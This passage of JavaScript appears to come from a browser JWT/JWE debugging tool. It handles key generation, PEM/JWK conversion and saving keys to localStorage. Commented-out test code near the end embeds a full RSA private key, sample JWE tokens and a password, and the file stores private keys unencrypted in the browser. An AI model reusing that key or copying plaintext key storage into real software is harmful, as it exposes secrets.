                document.getElementById('generatedPublicJWK').value = JSON.stringify(publicJWK, null, 2);

                symResult.style.display = 'none';
                asymResult.style.display = 'block';
            }
        }

        // Auto-save if enabled
        if (document.getElementById('autoSaveKeys').checked) {
            saveCurrentKeysToStorage();
        }

    } catch (error) {
        console.error('Key generation failed:', error);
    }
}

/**
 * Converts between PEM and JWK formats.
 * Used in the Key Generation UI for key conversion.
 */
async function convertKeyInKeyGenerationUI() {
    const direction = document.getElementById('conversionDirection').value;
    const output = document.getElementById('conversionOutput');
    const errorDiv = document.getElementById('conversionError');

    try {
        errorDiv.innerText = '';

        if (direction === 'pem-to-jwk') {
            const pemInput = document.getElementById('pemInput').value.trim();
            const algorithm = document.getElementById('jwkAlgorithm').value;

            if (!pemInput) {
                throw new Error('Please enter a PEM key');
            }

            const jwk = await pemToJwk(pemInput, algorithm);
            output.value = JSON.stringify(jwk, null, 2);

        } else {
            const jwkInput = document.getElementById('jwkInput').value.trim();

            if (!jwkInput) {
                throw new Error('Please enter a JWK');
            }

            const jwk = JSON.parse(jwkInput);
            const algorithm = jwk.alg || 'RS256'; // Default algorithm
            const pem = await jwkToSpkiPem(jwk, algorithm);
            output.value = pem;
        }

    } catch (error) {
        console.error('Key conversion failed:', error);
        errorDiv.innerText = 'Conversion failed: ' + error.message;
        output.value = '';
    }
}

/**
 * Copies text from textarea to clipboard.
 * Used in the Key Generation UI to copy generated keys.
 * @param {string} elementId - The ID of the textarea element.
 *
 */
async function copyKeyToClipboardFromKeyGenerationUI(elementId) {
    const element = document.getElementById(elementId);
    const text = element.value;

    await navigator.clipboard.writeText(text);
    // Visual feedback
    const originalBg = element.style.backgroundColor;
    element.style.backgroundColor = '#d4edda';
    setTimeout(() => {
        element.style.backgroundColor = originalBg;
    }, 500);

}

/**
 * Toggles auto-save functionality.
 * Used in the Key Generation UI to save generated keys automatically.
 */
function toggleAutoSaveInKeyGenerationUI() {
    const isEnabled = document.getElementById('autoSaveKeys').checked;
    localStorage.setItem('autoSaveKeys', isEnabled.toString());
}

/**
 * Saves current keys to local storage.
 * Used in the Key Generation UI to store generated keys for later use.
 */
function saveCurrentKeysToStorageInKeyGenerationView() {
    const algorithm = document.getElementById('keyAlgorithm').value;
    const keys = {
        algorithm: algorithm,
        timestamp: new Date().toISOString()
    };

    if (algorithm.startsWith('HS') || algorithm.startsWith('A')) {
        // symmetric
        keys.symmetric = document.getElementById('generatedSymKey').value;
    } else {
        // asymmetric
        keys.privateKeyPEM = document.getElementById('generatedPrivateKey').value;
        keys.publicKeyPEM = document.getElementById('generatedPublicKey').value;
        keys.privateKeyJWK = document.getElementById('generatedPrivateJWK').value;
        keys.publicKeyJWK = document.getElementById('generatedPublicJWK').value;
    }

    // Save if one key is present
    if (keys.symmetric || keys.privateKeyPEM) {
        const storedKeys = JSON.parse(localStorage.getItem('savedKeys') || '[]');
        storedKeys.push(keys);
        localStorage.setItem('savedKeys', JSON.stringify(storedKeys));
        updateStoredKeysListInKeyGenerationView();
        console.info('Keys saved successfully!');
    } else {
        console.error('No keys to save. Please generate keys first.');
    }
}

/**
 * Loads keys from local storage.
 * Used in the Key Generation UI to load previously saved keys.
 */
function loadKeysFromStorageInKeyGenerationView() {
    const storedKeys = JSON.parse(localStorage.getItem('savedKeys') || '[]');
    if (storedKeys.length === 0) {
        console.error('No saved keys found.');
        return;
    }

    // Load the most recent key set
    const mostRecent = storedKeys[storedKeys.length - 1];
    loadKeySetInKeyGenerationView(mostRecent);
}

/**
 * Loads a specific key set.
 * Used in the Key Generation UI to populate fields with saved keys.
 *
 */
function loadKeySetInKeyGenerationView(keySet) {
    document.getElementById('keyAlgorithm').value = DOMPurify.sanitize(keySet.algorithm.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
    updateKeyGenOptionsInKeyGenerationView();

    if (keySet.symmetric) {
        document.getElementById('generatedSymKey').value = DOMPurify.sanitize(keySet.symmetric.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
        document.getElementById('symmetricKeyResult').style.display = 'block';
        document.getElementById('asymmetricKeyResult').style.display = 'none';
    } else {
        document.getElementById('generatedPrivateKey').value = DOMPurify.sanitize(keySet.privateKeyPEM.replace(/</g, '&lt;').replace(/>/g, '&gt;')) || '';
        document.getElementById('generatedPublicKey').value = DOMPurify.sanitize(keySet.publicKeyPEM.replace(/</g, '&lt;').replace(/>/g, '&gt;')) || '';
        document.getElementById('generatedPrivateJWK').value = DOMPurify.sanitize(keySet.privateKeyJWK.replace(/</g, '&lt;').replace(/>/g, '&gt;')) || '';
        document.getElementById('generatedPublicJWK').value = DOMPurify.sanitize(keySet.publicKeyJWK.replace(/</g, '&lt;').replace(/>/g, '&gt;')) || '';
        document.getElementById('symmetricKeyResult').style.display = 'none';
        document.getElementById('asymmetricKeyResult').style.display = 'block';
    }
}

/**
 * Clears all stored keys.
 * Used in the Key Generation UI to delete all saved keys from local storage.
 * */
function clearStoredKeysInKeyGenerationView() {
    if (confirm('Are you sure you want to delete all saved keys? This cannot be undone.')) {
        localStorage.removeItem('savedKeys');
        updateStoredKeysListInKeyGenerationView();
        console.info('All saved keys have been deleted.');
    }
}

/**
 * Updates the stored keys list display
 * Used in the Key Generation UI to show saved keys.
 */
function updateStoredKeysListInKeyGenerationView() {
    const container = document.getElementById('storedKeysList');
    const storedKeys = JSON.parse(localStorage.getItem('savedKeys') || '[]');

    if (storedKeys.length === 0) {
        container.innerHTML = '<p>No saved keys found.</p>';
        return;
    }

    container.innerHTML = storedKeys.map((keySet, index) => `
        <div class="stored-key-item">
            <div class="stored-key-info">
                <strong>${keySet.algorithm}</strong> - ${new Date(keySet.timestamp).toLocaleString()}
            </div>
            <div class="stored-key-actions">
                <button onclick="loadKeySetInKeyGenerationView(${JSON.stringify(keySet).replace(/"/g, '&quot;').replace(/\)/g, '&rpar;')})" class="load-btn">Load</button>
                <button onclick="deleteKeySetInKeyGenerationView(${index})" class="clear-btn">Delete</button>
            </div>
        </div>
    `).join('');
}

/**
 * Deletes a specific key set
 * Used in the Key Generation UI to remove a saved key set from local storage.
 * @param {number} index - The index of the key set to delete.
 */
function deleteKeySetInKeyGenerationView(index) {
    if (confirm('Are you sure you want to delete this key set?')) {
        const storedKeys = JSON.parse(localStorage.getItem('savedKeys') || '[]');
        storedKeys.splice(index, 1);
        localStorage.setItem('savedKeys', JSON.stringify(storedKeys));
        updateStoredKeysListInKeyGenerationView();
    }
}

// #endregion ====================== End of Key Generation View Functions
function autoResize(el) {
    el.style.height = 'auto';
    // Use scrollHeight to get content height (includes padding)
    el.style.height = el.scrollHeight + 'px';
}
function syncTokenSectionHeight(called_from_JWT_or_JWE = "JWT") {
    if (called_from_JWT_or_JWE === "JWT") {
        var tokenSection = document.getElementById('token-section-jwt');
        var decodedSection = document.getElementById('decoded-token-section-jwt');
        if (!tokenSection || !decodedSection) return;

    }
    else if (called_from_JWT_or_JWE === "JWE") {
        var tokenSection = document.getElementById('token-section-jwe');
        var decodedSection = document.getElementById('decoded-token-section-jwe');
        if (!tokenSection || !decodedSection) return;

    }
    else {
        console.error('Unknown context for syncing token section height.\n Got ' + called_from_JWT_or_JWE + '  -  Expected JWT or JWE');
        return
    }

    // Reset to natural height before measuring
    tokenSection.style.height = 'auto';
    decodedSection.style.height = 'auto';

    // Measure natural heights after textarea auto-resize
    const tokenH = tokenSection.getBoundingClientRect().height;
    const decodedH = decodedSection.getBoundingClientRect().height;
    const target = Math.max(tokenH, decodedH);

    tokenSection.style.height = target + 'px';
    decodedSection.style.height = target + 'px';
}

document.addEventListener("DOMContentLoaded", async function () {
    /*
    toggleToJWE()
    await new Promise(r => setTimeout(r, 2000));
    changeAlgorithmEvent()
    document.getElementById("tokenJWE").value = "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYifQ.O8pQpU5KDRXB5hfwIVFR1tn6bXXpXYJmm1VZAmWq-L3zseZJf-bC3PzYiojy_OUgxbBN0mAVM-DC4XXdHMPKms-iJaOLlU5s0zgMGD0SslYk35GI0ysKgBcchjztDJQZMr4YU3ZkRA-X7n-dgZwSFhmvXs-dUhpmUk72Sim5o3e-bJm6CxRrfZ4sh1HB9QLbXvxG5ou8Bwts4U-YmWci8sESuRBCTPOwNvnnX-J_ZzdaB4j3_RXPhD59AQ3VNjByXcIz3ZtSV24lS6n3jclmlq9LLfW63rjhTn3QkAw0-BlwKzBHPVHhSb-txJk9zP5UBW8_Bf-Bj0s5Urwpvr3Q2A.nTDDP2zQDhKPOs59ypcYtg.0-_b604ZJuwxXnYvjnO3MnniG0TfzhUp9e7E6l_ZoRAlzat67Hl-8CWreOHYpys2B-AHA2Z5dZ_M1xqL0JkAAQ.BiNGNuWRvR6ifdU3TdNpZg"
    document.getElementById("privateKeyJWE").value = "-----BEGIN PRIVATE KEY-----MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDWNVUfSI9HjEE/HU45YC3/CG65ECCeF3/E3HT2TtA9YURfjW0tIiunJCB1AsFxSZH59Y5JMZ9GyLXHp3iTsod6v1VlC0nVJtPDXb0hWnqiK3d+h2HtC7A6zT95xjLvz6lBI6GLf9meJwmTCKGfZ8X7C4wcbJct80oosqDEkATspFguabCa85eO1kFgcx9VqwmZfuzkxHoaGsLRk/yZdYSKaPD8H0LX7yw4lnO8TFwda2WJgSk3YyobSEQZy+TxLiURu5N5HlSW4XR3EWR4GlpT8Bbb5NWlNomFZ97nVeBfTV/5t0VCTs9TVZitd7a+9x1Rq7y3r5B17sM0au9wJs1JAgMBAAECggEAAbaUIKw2YfYxu0Kya3KdW9UaGAppEII3kjd6uL4yWqSKOHx4lr4B0Gv6i/e9wlOiW2aYvY9kmWHNvEigfVpBYlrwAT6gMKm9ftsJU3k35fjInk0Sp0ZvuWwyLCiQPcu/gL6hYNtg092lYljVI5Og8nWwA3lNgZa6dHueRQpseoGVbKQNAmOt040dCrbv3AFLrKMJk297X6RlTSpTtZa+zaumYti8pdMPhjk09ZR467Bcr/t+i/fugQQqTk5p14TD8E9CiLUQkbpWxwbE7UtlnWl9eOslB3GiGeEs04dwAcr3wDQKdDW2nBS6yN4HPwys6AAM6IOzNfWQwvrAgCIiTQKBgQDuPZc760rkXWgvzxkijRtESvO/chQRZxedkT1ETTR8nxoKM4n4A417AVc3jxMuMGaBVIxcpSLfpPGPj9vPKxzai+rZ9aWywGw85oALLvz6+9+pDWjnRuiFJJ9lCJxmBfmHyrPh1c0zRru8ObHhqNUqxyCT+zHN96PwHlZV9KIf1wKBgQDmLSCwZ5F7b2/7HmmLB4YI9ItWqDyVh982iP6zxPuxRJkJim/5KC6z5D/sh5VJCEgRA3SeiuX4OnFT2Am5dNxizp+c1FZTPTvcFDIS+1MZoM1ZnYprJXd9M/aL64arim3Nz3hNPYVbTJLuib4+a5es23uslClKtc6Mp6xNG11X3wKBgBibUfCFZ/HYV/eAK3dvHZ7bIvvmG36EqGLE6pAQbVhl0nm1Qw3TyBwpUknRxEhkBWJcSjcTc1uoHK8YS7rFGDDWfMZQYfHpgAR2RklhbA28UCiU0v34S/Hci34S+pxrB4/n9tZfj9c4+hEB4IaPOp01ff7q1gURC+S0LXSpVMl3AoGAU2u3lTdz+pCAvTpgdgrcARLgDSAcFPWRaGpuJSkXLz/1VwfdXSe7BWeL42WgLT/bHo9qDKu6fSRxPjnmDFjWJtlL78LlJnXi4/hNzaNYksk8o2X9bKe/jpjumfdab4FUGms+5n+NfXFbLyis0mKcLgG96OYpsPIDUebTA38PbXECgYEAvJI+UHMw5KjV+9PdMjY1ctxeJeNftO09922d8E7yakALKgmAKvQCJTJDARBex+TPDj8aRMGE2e7LwN0r8nz37FE0zfcPBm36vFFBRcNapNn5E7GDiPPyG9XnuQSZrNL0vkeURrYC0P1Ygm/THcq7xJ6OtS9DGJY4MOqXYvCLuxY=-----END PRIVATE KEY-----"
    */
    initVulnerabilitiesList();
    decodeToken();
    verifySignature();
    syncTokenSectionHeight();
    // Auto-resize textareas (grow and shrink) and keep columns equal-height

    document.querySelectorAll('textarea').forEach(textarea => {
        // Initialize once on load
        autoResize(textarea);
        textarea.addEventListener('input', () => {
            autoResize(textarea);
            // Let layout update, then sync sections
        });
    });

    // toggleToJWE();

    // document.getElementById('decodedBodyJWE').value = "Live long and prosper."
    // document.getElementById('keyJWE').value = "Possibly-Instructive-Puzzle"
    // document.getElementById('saltJWE').value = "pqzhhrQ0pijlQ7FitRO1NA"
    // document.getElementById('tokenJWE').value  ="eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoicHF6aGhyUTBwaWpsUTdGaXRSTzFOQSIsInAyYyI6NDA5Nn0.2n7TrtzQow8ux0XA9m8K9Erngl8ohQdayYcxtuJY4HlaxvZX-O8_Cw.1aEqNPV7FV7xdF5WJwV37Q.0OJwQOS9Mu8ixdyimwVwbouPYiSnKXWxkCIwUKuP-3Q2tNh3bhQ9MCTKwHGkhn8pJd2WShQZHdLhzPte1KqPptitjulGYa1rYJFeZ1busiZMe-shUQmQ1HyrwhCZmqor.GZ7G-FxJiDyNUbxHnmYGog"
    // const cekInput = document.getElementById('cek');

    // let _value = cekInput.value;

    // Object.defineProperty(cekInput, 'value', {
    // get() {
    //     return _value;
    // },
    // set(val) {
    //     console.trace(`input#cek.value wurde geändert auf:`, val);
    //     _value = val;
    // }
    // });

});
window.verifySignature = verifySignature;
window.decrypt = decrypt;